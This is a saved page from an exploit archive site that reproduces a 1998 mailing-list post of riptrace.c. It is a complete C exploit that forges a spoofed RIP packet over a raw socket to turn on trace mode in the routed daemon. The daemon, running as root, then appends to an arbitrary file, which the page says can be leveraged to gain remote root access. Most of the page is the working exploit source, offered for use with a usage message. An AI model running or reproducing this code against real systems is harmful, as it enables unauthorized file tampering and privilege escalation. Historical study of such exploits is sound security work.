<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0053)http://www.insecure.org/sploits/routed.tracefile.html -->
<HTML><HEAD><TITLE>routed trace file exploit</TITLE>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<META 
content="routed has the ability to have trace mode turned on remotely using any arbitrary filename.  Thus you can append stuff to arbitrary files remotely." 
name=description>
<META 
content=" IRIX, NetBSD, Redhat, Thus, ability, append, arbitrary, exploit, file, filename, files, has, have, linux, mode, remotely, routed, stuff, trace, turned, using, vulnerable" 
name=keywords>
<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
<BODY text=#ffffff vLink=#7f7f7f link=#0b7cff bgColor=#000000>
<TABLE cellSpacing=0 cellPadding=0 width="100%">
  <TBODY>
  <TR>
    <TD align=left><A href="http://www.insecure.org/"><IMG height=90 
      src="routed trace file exploit_files/Insecurelogo-eye-90x168.gif" 
      width=168 border=0></A> </TD>
    <TD vAlign=bottom align=right><!-- Begin Banner Code --><IFRAME 
      marginWidth=0 marginHeight=0 src="routed trace file exploit_files/pro.pl" 
      frameBorder=0 width=728 scrolling=no 
      height=90>
<SCRIPT LANGUAGE="JavaScript"><!--
random = parseInt(Math.random()*10000)
banner = '<A HREF="http://cgi.insecure.org/cgi-bin/pro/pro.pl?banner=NonSSI;'
banner += 'page=' + random + '" >';
banner += '<IMG SRC="http://cgi.insecure.org/cgi-bin/pro/pro.pl?'
banner += 'page=' + random + '" '
banner += ' ALT="Click Here!" BORDER=0></A>'
document.write(banner)
// --></SCRIPT>
<NOSCRIPT>
<A HREF="http://cgi.insecure.org/cgi-bin/pro/pro.pl?banner=NonSSI;page=01">
<IMG SRC="http://cgi.insecure.org/cgi-bin/pro/pro.pl?page=01"
     ALT="Click Here!" BORDER=0></A>
</NOSCRIPT>
</IFRAME><!-- End Banner Code --></TD></TR></TBODY></TABLE>
<CENTER>
<H1><B>routed trace file exploit</B></H1></CENTER>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>Summary</B></TH></TR></TBODY></TABLE>
<TABLE>
  <TBODY>
  <TR>
    <TD vAlign=top><B>Description:</B></TD>
    <TD>routed has the ability to have trace mode turned on remotely using any 
      arbitrary filename. Thus you can append stuff to arbitrary files 
    remotely.</TD></TR>
  <TR>
    <TD vAlign=top><B>Author:</B></TD>
    <TD>Rootshell</TD></TR>
  <TR>
    <TD vAlign=top><B>Compromise:</B></TD>
    <TD>You should be able to leverage this to <FONT color=#ff0000 
      size=+3>root </FONT>remote access.</TD></TR>
  <TR>
    <TD vAlign=top><B>Vulnerable Systems:</B></TD>
    <TD>Redhat linux; IRIX 5.2-5.3-6.2 is vulnerable, NetBSD 1.2 is 
    vulnerable.</TD></TR>
  <TR>
    <TD vAlign=top><B>Date:</B></TD>
    <TD>8 January 1998 </TD></TR><!-- <TR><TD VALIGN="top"><B>Notes:</B></TD><TD> </TD></TR> --></TBODY></TABLE>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>Details</B></TH></TR></TBODY></TABLE><BR><PRE>
Date: Thu, 8 Jan 1998 15:19:03 -0600
From: Aleph One &lt;aleph1@DFW.NET&gt;
To: BUGTRAQ@NETSPACE.ORG
Subject: riptrace.c

More goodies from rootshell.com.

http://www.rootshell.com/archive-Rbf4ahcmxzw5qn2S/199801/riptrace.c

/*
 * BSD 4.4 based routed trace file exploit
 *
 * (C) 1997 Rootshell [ http://www.rootshell.com/ ]
 *
 * &lt;info@rootshell.com&gt;
 *
 * routed has the ability for a packet to be sent to the daemon that will
 * turn on debug mode.  The packet is able to specify the file which is
 * later opened without any checks being placed on that file open.
 *
 * Result: You can append to any file on the filesystem.
 *
 * The following syscall is made AS ROOT.
 *
 * ftrace = fopen(file, "a");
 *
 * This is obviously a LARGE problem.
 *
 * Solaris 2.6 seems to ignore these packets and returns the following
 * error.  Mileage may vary.. :
 *
 * in.routed[6580]: trace command from 1.2.3.4 - ignored
 *
 * Redhat routed was tested and found to check if the packet came from
 * a valid router.  If you spoof the RIP packet from their default
 * gateway the packet is ACCEPTED.
 *
 * Note: Once a trace file is opened you must close the trace file and then
 * open another file.
 *
 * Exploit tested under Linux 2.0.x.
 *
 * ps.  Just run gated! (http://www.gated.org/)
 *
 */


/* File to append to on filesystem with debug output */

#define FILETOCREATE    "/tmp/rootshell"


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/in_systm.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/ip_tcp.h&gt;
#include &lt;linux/udp.h&gt;
#include &lt;netinet/protocols.h&gt;
#include &lt;netdb.h&gt;
#include &lt;protocols/routed.h&gt;
#include &lt;linux/route.h&gt;

#define err(x) { fprintf(stderr, x); exit(1); }
#define errs(x, y) { fprintf(stderr, x, y); exit(1); }

/*
 * in_cksum --
 *  Checksum routine for Internet Protocol family headers (C Version)
 */
unsigned short in_cksum(addr, len)
u_short *addr;
int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft &gt; 1)  {
        sum += *w++;
        nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nleft == 1) {
        *(u_char *)(&amp;answer) = *(u_char *)w ;
        sum += answer;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff); /* add hi 16 to low 16 */
    sum += (sum &gt;&gt; 16);         /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return(answer);
}

/* Send faked UDP packet. */
int sendpkt_udp(sin, s, data, datalen, saddr, daddr, sport, dport)
struct sockaddr_in *sin;
unsigned short int s, datalen, sport, dport;
unsigned long  int saddr, daddr;
char *data;
{
  struct iphdr  ip;
  struct udphdr udp;
  static char packet[8192];

  /* Fill in IP header values. */
  ip.ihl      = 5;
  ip.version  = 4;
  ip.tos      = 0;
  ip.tot_len  = htons(28 + datalen);
  ip.id       = htons(31337 + (rand()%100));
  ip.frag_off = 0;
  ip.ttl      = 255;
  ip.protocol = IPPROTO_UDP;
  ip.check    = 0;
  ip.saddr    = saddr;
  ip.daddr    = daddr;
  ip.check    = in_cksum((char *)&amp;ip, sizeof(ip));

  /* Fill in UDP header values. Checksums are unnecassary. */
  udp.source = htons(sport);
  udp.dest   = htons(dport);
  udp.len    = htons(8 + datalen);
  udp.check  = (short) 0;

  /* Copy the headers into our character array. */
  memcpy(packet, (char *)&amp;ip, sizeof(ip));
  memcpy(packet+sizeof(ip), (char *)&amp;udp, sizeof(udp));
  memcpy(packet+sizeof(ip)+sizeof(udp), (char *)data, datalen);

  return(sendto(s, packet, sizeof(ip)+sizeof(udp)+datalen, 0,
         (struct sockaddr *)sin, sizeof(struct sockaddr_in)));
}

/* Lookup the name. Also handles a.b.c.d dotted quads. Returns 0 on error */
unsigned int lookup(host)
char *host;
{
  unsigned int addr;
  struct hostent *he;

  addr = inet_addr(host);       /* Try if it's a "127.0.0.1" style string */
  if (addr == -1)               /* If not, lookup the host */
  {
    he = gethostbyname(host);
    if ((he == NULL) || (he-&gt;h_name == NULL) || (he-&gt;h_addr_list == NULL))
      return 0;

    bcopy(*(he-&gt;h_addr_list), &amp;(addr), sizeof(he-&gt;h_addr_list));
  }
  return(addr);
}

void
main(argc, argv)
int argc; char **argv;
{
  unsigned int saddr, daddr;
  struct sockaddr_in sin;
  int s;
  struct rip rp;

  if(argc != 4)
    errs("\nSee http://www.rootshell.com/\n\nUsage: %s &lt;source_router&gt; &lt;dest_addr&gt; &lt;command&gt;\n\ncommand: 3 = trace on, 4 = trace off\n\n",argv[0]);

  if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    err("Unable to open raw socket.\n");

  if(!(saddr = lookup(argv[1])))
    err("Unable to lookup source address.\n");
  if(!(daddr = lookup(argv[2])))
    err("Unable to lookup destination address.\n");

  sin.sin_family     = AF_INET;
  sin.sin_addr.s_addr= daddr;
  sin.sin_port       = 520;

  /* Fill in RIP packet info */
  rp.rip_cmd = atoi(argv[3]); /* 3 = RIPCMD_TRACEON, 4 = RIPCMD_TRACEOFF */
  rp.rip_vers = RIPVERSION; /* Must be version 1 */
  sprintf(rp.rip_tracefile, FILETOCREATE);

  if((sendpkt_udp(&amp;sin, s, &amp;rp, sizeof(rp), saddr, daddr, 520, 520)) == -1)
  {
    perror("sendpkt_udp");
    err("Error sending the UDP packet.\n");
  }
}
</PRE><PRE>
</PRE>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>More Exploits!</B></TH></TR></TBODY></TABLE><BR>The master 
index of all exploits is available <A 
href="http://www.insecure.org/sploits_all.html">here</A> (Very large file)<BR>Or 
you can pick your favorite operating system:<BR>
<TABLE border=1>
  <TBODY>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_all.html">All OS's</A></TD>
    <TD><A href="http://www.insecure.org/sploits_linux.html">Linux</A></TD>
    <TD><A 
      href="http://www.insecure.org/sploits_solaris.html">Solaris/SunOS</A></TD>
    <TD><A 
    href="http://www.insecure.org/sploits_microshit.html">Micro$oft</A></TD></TR>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_bsd.html">*BSD</A></TD>
    <TD><A href="http://www.insecure.org/sploits_mac.html">Macintosh</A></TD>
    <TD><A href="http://www.insecure.org/sploits_aix.html">AIX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_irix.html">IRIX</A></TD></TR>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_ultrix.html">ULTRIX/Digital 
      UNIX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_hpux.html">HP/UX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_sco.html">SCO</A></TD>
    <TD><A href="http://www.insecure.org/sploits_remote.html">Remote 
      exploits</A></TD></TR></TBODY></TABLE><BR>This page is part of <A 
href="http://www.insecure.org/sploits.html">Fyodor's exploit world</A>. For a 
free program to automate scanning your network for vulnerable hosts and 
services, check out my network mapping tool, <A 
href="http://www.insecure.org/nmap/index.html">nmap</A>. Or try these <A 
href="http://www.insecure.org/">Insecure.Org</A> resouces:<BR><BR>
<CENTER>[ <A href="http://www.insecure.org/nmap/index.html"><FONT 
color=#ffffff>Nmap</FONT></A> | <A 
href="http://www.insecure.org/tools.html"><FONT color=#ffffff>Tools</FONT></A> | 
<A href="http://lists.insecure.org/"><FONT color=#ffffff>Lists</FONT></A> | <A 
href="http://www.insecure.org/reading.html"><FONT 
color=#ffffff>Reading</FONT></A> | <A href="http://www.insecure.org/"><FONT 
color=#ffffff>News</FONT></A> | <A 
href="http://www.insecure.org/myworld.html"><FONT 
color=#ffffff>About/Contact</FONT></A> | <A 
href="http://www.insecure.org/advertising.html"><FONT 
color=#ffffff>Advertising</FONT></A> | <A 
href="http://www.insecure.org/privacy.html"><FONT color=#ffffff>Privacy 
Policy</FONT></A> ]<BR></CENTER></BODY></HTML>
